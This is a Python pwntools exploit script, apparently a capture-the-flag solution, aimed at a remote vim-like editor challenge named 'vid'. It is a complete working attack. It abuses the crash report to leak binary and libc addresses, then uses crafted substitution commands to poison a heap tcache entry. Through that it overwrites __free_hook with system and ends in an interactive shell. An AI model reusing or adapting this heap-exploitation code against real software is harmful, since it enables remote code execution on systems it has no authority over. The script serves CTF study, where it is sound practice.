from pwn import *

binary = ELF('./vid')
libc = ELF('./libc.so.6')

context.log_level = 'debug'
#p = process(['./libs/ld-linux-x86-64.so.2', './vid'], env={'LD_LIBRARY_PATH': './libs'})
p = remote('pwn03.chal.ctf.westerns.tokyo', 17265)

# 1. leak
p.send('i')
p.send('aaaaa')
p.send('\x1b')

#p.send(':%s/x/' + 'X'*0x29a + '/\n')

p.send(':')
p.send('%s/aaaaa/b/g\n')

p.send('i')
p.send('a')

p.recvuntil('Please report to me!\n')

p.recvuntil('vid(+')
binary_ofs = int(p.recvuntil(')', True), 16)
p.recvuntil('[')
binary_leak = int(p.recvuntil(']', True), 16)
binary.address = binary_leak - binary_ofs
log.success('binary: {:016x}'.format(binary.address))

p.recvuntil('(__libc_start_main+')
libc_ofs = int(p.recvuntil(')', True), 16)
p.recvuntil('[')
libc_leak = int(p.recvuntil(']', True), 16)
libc.address = libc_leak - libc_ofs - libc.symbols['__libc_start_main']
log.success('  libc: {:016x}'.format(libc.address))

p.recvuntil('Editor will be respawned...')

hook = p64(libc.symbols['__free_hook'] - 3)[:-2]
system = p64(libc.symbols['system'])[:-2]
for to_write in [hook, system]:
    for banned_char in '/\0\n':
        if banned_char in to_write:
            log.critical('banned char present')
            exit()

sleep(0.9)

# 2. setup chunksize 0x210 tcache
p.send(':')
p.send('%s/' + 'A'*0x200 + hook + '/' + '/g\n')

p.send('i')
p.send('aaaaa')
p.send('\x1b')

p.send(':')
p.send('%s/aaaaa/b/g\n')

p.send('i')
p.send('a')

p.recvuntil('Editor will be respawned...')

#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
#gdb.attach(p, 'handle SIGALRM ignore\nbreak malloc if $rdi <= 0x208 && $rdi > 0x1f8\n')

sleep(0.9)


# 3. exploit
p.send('i')
p.send('\0' + '\n' + '\0')
p.send('\x1b')

p.send(':')
p.send('%s/' + '\0' + '/' + ('sh;' + system + '\0\0' + '\\n') * 0x10 + '/\n')

p.interactive()